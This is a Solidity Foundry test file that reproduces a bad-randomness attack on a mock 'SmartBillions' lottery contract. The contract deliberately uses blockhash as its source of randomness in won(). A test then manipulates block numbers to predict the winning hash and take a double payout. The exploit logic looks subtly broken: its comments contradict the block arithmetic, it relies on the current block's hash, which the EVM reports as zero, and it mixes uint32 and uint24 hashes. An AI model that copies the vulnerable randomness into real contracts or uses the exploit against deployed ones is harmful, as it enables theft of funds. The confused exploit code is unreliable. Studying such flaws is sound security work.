import "forge-std/Test.sol";

pragma solidity ^0.8.33;

contract SmartBillions {
    struct Bet {
        uint32 betHash;
        uint24 blockNum;
        uint value;
    }

    mapping(address => Bet) public bets;
    mapping(address => uint) public balances;

    function invest(address /*_partner*/) external payable {
        balances[msg.sender] += msg.value;
    }

    function betOf(address _who) external view returns (uint) {
        return bets[_who].betHash != 0 ? bets[_who].value : 0;
    }

    function betValueOf(address _who) external view returns (uint) {
        return bets[_who].value;
    }

    function placeBet(uint32 betHash) external payable {
        require(bets[msg.sender].value == 0, "Already have active bet");
        require(msg.value > 0, "Bet value must be > 0");
        bets[msg.sender] = Bet({
            betHash: betHash,
            blockNum: uint24(block.number),
            value: msg.value
        });
        balances[msg.sender] += msg.value;
    }

    function won() external {
        Bet memory b = bets[msg.sender];
        require(b.value > 0, "No active bet");

        // Vulnerable randomness: blockhash of bet.blockNum
        uint24 blockHash24 = uint24(uint256(blockhash(b.blockNum)));

        if (blockHash24 == b.betHash) {
            uint prize = b.value * 2;
            require(address(this).balance >= prize, "Insufficient contract balance");
            balances[msg.sender] -= b.value;
            bets[msg.sender].value = 0;
            bets[msg.sender].betHash = 0;
            bets[msg.sender].blockNum = 0;
            payable(msg.sender).transfer(prize);
        } else {
            // Lose bet: just clear bet
            balances[msg.sender] -= b.value;
            bets[msg.sender].value = 0;
            bets[msg.sender].betHash = 0;
            bets[msg.sender].blockNum = 0;
        }
    }

    receive() external payable {}
}

contract ExploitTest is Test {
    SmartBillions victim;

    function setUp() public {
        victim = new SmartBillions();
        vm.deal(address(victim), 100 ether);
        vm.deal(address(this), 10 ether);
    }

    function test_exploit_bad_randomness() public {
        uint betValue = 1 ether;

        // Advance to next block to have blockhash available for current block
        uint currentBlock = block.number;
        vm.roll(currentBlock + 1);

        // The bet will be placed at block number currentBlock + 1
        uint24 betBlockNum = uint24(block.number);

        // Get the blockhash for the bet block number
        uint24 predictedHash = uint24(uint256(blockhash(betBlockNum)));

        // Roll back to previous block to place bet at betBlockNum (which will be recorded as block.number)
        vm.roll(currentBlock);

        // Place bet with predictedHash and blockNum = current block (which will be betBlockNum after roll)
        victim.placeBet{value: betValue}(predictedHash);

        // Roll forward to betBlockNum so blockhash is available for won()
        vm.roll(betBlockNum);

        uint balBefore = address(this).balance;
        victim.won();
        uint balAfter = address(this).balance;

        // We should have won double the bet value
        assertGt(balAfter, balBefore, "Exploit failed: did not win prize");

        uint prize = victim.betOf(address(this));
        assertEq(prize, 0, "betOf should be zero after winning");

        uint betValAfter = victim.betValueOf(address(this));
        assertEq(betValAfter, 0, "Bet value not cleared after won");
    }
}

